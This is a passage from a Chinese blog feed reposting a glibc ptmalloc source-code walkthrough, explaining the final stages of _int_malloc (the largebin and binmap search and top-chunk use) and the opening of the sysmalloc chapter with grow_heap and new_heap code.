&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分代码的整体意思就是要尝试从largebin中取出对应的chunk了。<br>这里的<code>idx</code>是在前面（上一章分析的<code>_int_malloc</code>函数前面一部分中）根据宏<code>largebin_index</code>计算的。接下来就要根据<code>idx</code>获得largebin中的双向链表头指针<code>bin</code>，然后从<code>bin-&gt;bk</code>开始从尾到头（根据chunk大小从小到大）遍历整个双向链表，找到第一个大于用户需要分配的chunk大小<code>nb</code>的chunk指针<code>victim</code>。<br>找到<code>victim</code>后，需要将其拆开成两部分，第一部分是要返回给用户的chunk，第二部分分为两种情况，如果其大小小于<code>MINSIZE</code>，则不能构成一个最小chunk，这种情况下就将拆开前的整个<code>victim</code>返回给用户；如果大于<code>MINSIZE</code>，就将拆开后的第二部分<code>remainder</code>插入到unsortedbin中，然后把第一部分<code>victim</code>返回给用户。</p><p>继续往下看<code>_int_malloc</code>函数，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * _int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br><br>        ...<br><br>        ++idx;<br>        bin = <span class="hljs-built_in">bin_at</span> (av, idx);<br>        block = <span class="hljs-built_in">idx2block</span>(idx);<br>        map = av-&gt;binmap[block];<br>        bit = <span class="hljs-built_in">idx2bit</span>(idx);<br><br>        <span class="hljs-keyword">for</span> (;;) &#123;<br>            <span class="hljs-keyword">if</span> (bit &gt; map || bit == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                        <span class="hljs-keyword">goto</span> use_top;<br>                &#125; <span class="hljs-keyword">while</span> ((map = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>                bin = <span class="hljs-built_in">bin_at</span> (av, (block &lt;&lt; BINMAPSHIFT));<br>                bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">while</span> ((bit &amp; map) == <span class="hljs-number">0</span>) &#123;<br>                bin = <span class="hljs-built_in">next_bin</span>(bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">assert</span>(bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>            victim = <span class="hljs-built_in">last</span>(bin);<br>            <span class="hljs-keyword">if</span> (victim == bin) &#123;<br>                av-&gt;binmap[block] = map &amp;= ~bit;<br>                bin = <span class="hljs-built_in">next_bin</span>(bin);<br>                bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">else</span> &#123;<br>                size = <span class="hljs-built_in">chunksize</span>(victim);<br>                <span class="hljs-built_in">assert</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ) (nb));<br>                remainder_size = size - nb;<br>                <span class="hljs-built_in">unlink</span>(av, victim, bck, fwd);<br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) &#123;<br>                    <span class="hljs-built_in">set_inuse_bit_at_offset</span>(victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    remainder = <span class="hljs-built_in">chunk_at_offset</span>(victim, nb);<br>                    bck = <span class="hljs-built_in">unsorted_chunks</span> (av);<br>                    fwd = bck-&gt;fd;<br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>                        errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                        <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">in_smallbin_range</span>(nb))<br>                        av-&gt;last_remainder = remainder;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">in_smallbin_range</span>(remainder_size)) &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                    <span class="hljs-built_in">set_head</span>(victim,<br>                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    <span class="hljs-built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);<br>                    <span class="hljs-built_in">set_foot</span>(remainder, remainder_size);<br>                &#125;<span class="hljs-built_in">check_malloced_chunk</span> (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>                <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br><br>        ...<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一部分的整体意思是，前面在largebin中寻找特定大小的空闲chunk，如果没找到，这里就要遍历largebin中的其他更大的chunk双向链表，继续寻找。<br>开头的<code>++idx</code>就表示，这里要从largebin中下一个更大的chunk双向链表开始遍历。ptmalloc中用一个bit表示<code>malloc_state</code>的<code>bins</code>数组中对应的位置上是否有空闲chunk，bit为1表示有，为0则没有。ptmalloc通过4个block（一个block 4字节）一共128个bit管理<code>bins</code>数组。因此，代码中计算的block表示对应的<code>idx</code>属于哪一个block，<code>map</code>就表是block对应的bit组成的二进制数字。<br>接下来进入for循环，如果<code>bit &gt; map</code>，表示该<code>map</code>对应的整个<code>block</code>里都没有大于<code>bit</code>位置的空闲的chunk，因此就要找下一个<code>block</code>。因为后面的<code>block</code>只要不等于0，就肯定有空闲chunk，并且其大小大于<code>bit</code>位置对应的chunk，下面就根据<code>block</code>，取出<code>block</code>对应的第一个双向链表的头指针。这里也可以看出，设置<code>map</code>和<code>block</code>也是为了加快查找的速度。如果遍历完所有<code>block</code>都没有空闲chunk，这时只能从top chunk里分配chunk了，因此跳转到<code>use_top</code>。<br>如果有空闲chunk，接下来就通过一个while循环依次比较找出到底在哪个双向链表里存在空闲chunk，最后获得空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。<br>接下来，如果找到的双向链表又为空，则继续前面的遍历，找到空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。如果找到的双向链表不为空，就和上面一部分再largebin中找到空闲chunk的操作一样了，这里就不继续分析了。</p><p>继续往下看<code>_int_malloc</code>，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * _int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br><br>        ...<br><br>        use_top:<br><br>        victim = av-&gt;top;<br>        size = <span class="hljs-built_in">chunksize</span>(victim);<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE )) &#123;<br>            remainder_size = size - nb;<br>            remainder = <span class="hljs-built_in">chunk_at_offset</span>(victim, nb);<br>            av-&gt;top = remainder;<br>            <span class="hljs-built_in">set_head</span>(victim,<br>                    nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>            <span class="hljs-built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);<br><br>            <span class="hljs-built_in">check_malloced_chunk</span> (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>            <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">have_fastchunks</span>(av)) &#123;<br>            <span class="hljs-built_in">malloc_consolidate</span>(av);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">in_smallbin_range</span>(nb))<br>                idx = <span class="hljs-built_in">smallbin_index</span>(nb);<br>            <span class="hljs-keyword">else</span><br>                idx = <span class="hljs-built_in">largebin_index</span>(nb);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">void</span> *p = <span class="hljs-built_in">sysmalloc</span>(nb, av);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是<code>_int_malloc</code>的最后一部分了，这部分代码的整体意思分为三部分，首先从top chunk中尝试分配内存；如果失败，就检查fastbin中是否有空闲内存了（其他线程此时可能将释放的chunk放入fastbin中了），如果不空闲，就合并fastbin中的空闲chunk并放入smallbin或者largebin中，然后会回到<code>_int_malloc</code>函数中最前面的for循环，重新开始查找空闲chunk；如果连fastbin中都没有空闲内存了，这时只能通过<code>sysmalloc</code>从系统分配内存了，该函数前面几章里已经分析过了一部分了，下一章会再次进入这个函数进行分析。这部分代码很简单，关键函数前面几章都碰到过了，这里就不详细分析了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面简单总结一遍<code>_int_malloc</code>函数的整体思路。<br>第一步：如果进程没有关联的分配区，就通过<code>sysmalloc</code>从操作系统分配内存。<br>第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。<br>第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。<br>第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。<br>第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。<br>第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。<br>第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过<code>sysmalloc</code>从操作系统分配内存。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析——5</title>
    <link href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%945/"/>
    <url>/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%945/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—sysmalloc"><a href="#malloc源码分析—sysmalloc" class="headerlink" title="malloc源码分析—sysmalloc"></a>malloc源码分析—sysmalloc</h1><p>本章主要分析<code>sysmalloc</code>的代码，在《malloc源码分析—2》中已经分析了部分<code>sysmalloc</code>的代码，主要用于对分配区进行初始化。本章查看余下的代码，</p><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * <span class="hljs-title">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> </span>&#123;<br>    mchunkptr old_top;<br>    INTERNAL_SIZE_T old_size;<br>    <span class="hljs-type">char</span> *old_end;<br><br>    <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">char</span> *brk;<br><br>    <span class="hljs-type">long</span> correction;<br>    <span class="hljs-type">char</span> *snd_brk;<br><br>    INTERNAL_SIZE_T front_misalign;<br>    INTERNAL_SIZE_T end_misalign;<br>    <span class="hljs-type">char</span> *aligned_brk;<br><br>    mchunkptr p;<br>    mchunkptr remainder;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;<br><br>    <span class="hljs-type">size_t</span> pagesize = <span class="hljs-built_in">GLRO</span>(dl_pagesize);<br>    <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br>    ...<br><br>    old_top = av-&gt;top;<br>    old_size = <span class="hljs-built_in">chunksize</span>(old_top);<br>    old_end = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">chunk_at_offset</span>(old_top, old_size));<br>    brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena) &#123;<br>        heap_info *old_heap, *heap;<br>        <span class="hljs-type">size_t</span> old_heap_size;<br><br>        old_heap = <span class="hljs-built_in">heap_for_ptr</span>(old_top);<br>        old_heap_size = old_heap-&gt;size;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span><br>                &amp;&amp; <span class="hljs-built_in">grow_heap</span>(old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>) &#123;<br>            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>            arena_mem += old_heap-&gt;size - old_heap_size;<br>            <span class="hljs-built_in">set_head</span>(old_top,<br>                    (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top) | PREV_INUSE);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = <span class="hljs-built_in">new_heap</span>(nb + (MINSIZE + <span class="hljs-built_in">sizeof</span>(*heap)), mp_.top_pad))) &#123;<br>            heap-&gt;ar_ptr = av;<br>            heap-&gt;prev = old_heap;<br>            av-&gt;system_mem += heap-&gt;size;<br>            arena_mem += heap-&gt;size;<br>            <span class="hljs-built_in">top</span> (av) = <span class="hljs-built_in">chunk_at_offset</span>(heap, <span class="hljs-built_in">sizeof</span>(*heap));<br>            <span class="hljs-built_in">set_head</span>(<span class="hljs-built_in">top</span> (av), (heap-&gt;size - <span class="hljs-built_in">sizeof</span> (*heap)) | PREV_INUSE);<br><br>            old_size = (old_size - MINSIZE ) &amp; ~MALLOC_ALIGN_MASK;<br>            <span class="hljs-built_in">set_head</span>(<span class="hljs-built_in">chunk_at_offset</span> (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                    <span class="hljs-number">0</span> | PREV_INUSE);<br>            <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE) &#123;<br>                <span class="hljs-built_in">set_head</span>(<span class="hljs-built_in">chunk_at_offset</span> (old_top, old_size),<br>                        (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                <span class="hljs-built_in">set_foot</span>(<span class="hljs-built_in">chunk_at_offset</span> (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>                <span class="hljs-built_in">set_head</span>(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>                _int_free(av, old_top, <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">set_head</span>(old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                <span class="hljs-built_in">set_foot</span>(old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>            <span class="hljs-keyword">goto</span> try_mmap;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br><br>        ...<br><br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，<code>old_top</code>、<code>old_size</code>和<code>old_end</code>分别保存了top chunk的指针，大小以及尾部的地址。<br>如果是非主分配区，首先通过<code>heap_for_ptr</code>获得原top chunk对应的<code>heap_info</code>指针，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">heap_for_ptr</span>(ptr) \<br>  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - <span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><p>对于非主分配区，因为每个heap是按照<code>HEAP_MAX_SIZE</code>的大小分配且对齐的，而每个topchunk存在于每个heap的剩余空间（高地址处），因此通过<code>heap_for_ptr</code>就能取出<code>heap_info</code>指针，<code>heap_info</code>保存了每个heap的相关信息。获得<code>heap_info</code>指针后，就能获得该heap当前被使用的大小并将其保存在<code>old_heap_size</code>中。<br>根据《malloc源码分析—4》，进入到sysmalloc前会尝试在top chunk分配内存，因此代码执行到这里肯定失败了。所以这里只有<code>MINSIZE + nb - old_size&gt;0</code>这一种情况，即这时的top chunk空间不足了，因此首先通过<code>grow_heap</code>尝试向heap的高地址处增加heap当前使用的大小，即top chunk的大小，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> grow_heap(heap_info *h, <span class="hljs-keyword">long</span> diff) &#123;<br>    size_t pagesize = GLRO(dl_pagesize);<br>    <span class="hljs-keyword">long</span> new_size;<br><br>    diff = ALIGN_UP(diff, pagesize);<br>    new_size = (<span class="hljs-keyword">long</span>) h-&gt;size + diff;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) new_size &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) HEAP_MAX_SIZE)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) new_size &gt; h-&gt;mprotect_size) &#123;<br>        <span class="hljs-keyword">if</span> (__mprotect((<span class="hljs-keyword">char</span> *) h + h-&gt;mprotect_size,<br>                (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) new_size - h-&gt;mprotect_size,<br>                PROT_READ | PROT_WRITE) != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-2</span>;<br><br>        h-&gt;mprotect_size = new_size;<br>    &#125;<br><br>    h-&gt;size = new_size;<br>    LIBC_PROBE(memory_heap_more, <span class="hljs-number">2</span>, h, h-&gt;size);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码其实最关键的是<code>h-&gt;size = new_size</code>这一样，表示重新设置heap的大小至<code>new_size</code>。<br>回到sysmalloc中，假设<code>grow_heap</code>成功，即将top chunk的大小设置为<code>MINSIZE + nb</code>，则重新设置分配区使用的内存大小，并且设置top chunk的<code>size</code>至新值（注意这里的<code>size</code>不能直接设置为<code>MINSIZE + nb</code>是因为在<code>grow_heap</code>中有对齐操作）。</p><p>假设<code>grow_heap</code>失败，大部分情况下说明heap的使用大小已经接近其最大值<code>HEAP_MAX_SIZE</code>了，此时只能通过<code>new_heap</code>重新分配一个heap，注意传入的参数<code>mp_.top_pad</code>表示在分配内存时，额外多分配的内存。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs smali">static heap_info * internal_function new_heap(size_t size, size_t top_pad) &#123;<br>    size_t pagesize = GLRO(dl_pagesize);<br>    char *p1, *p2;<br>    unsigned<span class="hljs-built_in"> long </span>ul;<br>    heap_info *h;<br><br>   <span class="hljs-built_in"> if </span>(size + top_pad &lt; HEAP_MIN_SIZE)<br>        size = HEAP_MIN_SIZE;<br>    else<span class="hljs-built_in"> if </span>(size + top_pad &lt;= HEAP_MAX_SIZE)<br>        size += top_pad;<br>    else<span class="hljs-built_in"> if </span>(size &gt; HEAP_MAX_SIZE)<br>       <span class="hljs-built_in"> return </span>0;<br>    else<br>        size = HEAP_MAX_SIZE;<br>    size = ALIGN_UP(size, pagesize);<br><br>    p2 = MAP_FAI<span class="hljs-class">LED;</span><br>   <span class="hljs-built_in"> if </span>(aligned_heap_area) &#123;<br>        p2 = (char *) MMAP(aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,<br>                MAP_NORESERVE);<br>        aligned_heap_area = NU<span class="hljs-class">LL;</span><br>       <span class="hljs-built_in"> if </span>(p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123;<br>            __munmap(p2, HEAP_MAX_SIZE);<br>            p2 = MAP_FAI<span class="hljs-class">LED;</span><br>        &#125;<br>    &#125;<br>   <span class="hljs-built_in"> if </span>(p2 == MAP_FAILED) &#123;<br>        p1 = (char *) MMAP(0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE);<br>       <span class="hljs-built_in"> if </span>(p1 != MAP_FAILED) &#123;<br>            p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1))<br>                    &amp; ~(HEAP_MAX_SIZE - 1));<br>            ul = p2 - p1;<br>           <span class="hljs-built_in"> if </span>(ul)<br>                __munmap(p1, ul);<br>            else<br>                aligned_heap_area = p2 + HEAP_MAX_SIZE;<br>            __munmap(p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);<br>        &#125; else &#123;<br>            p2 = (char *) MMAP(0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);<br>           <span class="hljs-built_in"> if </span>(p2 == MAP_FAILED)<br>               <span class="hljs-built_in"> return </span>0;<br><br>           <span class="hljs-built_in"> if </span>((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123;<br>                __munmap(p2, HEAP_MAX_SIZE);<br>               <span class="hljs-built_in"> return </span>0;<br>            &#125;<br>        &#125;<br>    &#125;<br>   <span class="hljs-built_in"> if </span>(__mprotect(p2, size, PROT_READ | PROT_WRITE) != 0) &#123;<br>        __munmap(p2, HEAP_MAX_SIZE);<br>       <span class="hljs-built_in"> return </span>0;<br>    &#125;<br>    h = (heap_info *) p2;<br>    h-&gt;size = size;<br>    h-&gt;mprotect_size = size;<br>    LIBC_PROBE(memory_heap_new, 2, h, h-&gt;size);<br>   <span class="hljs-built_in"> return 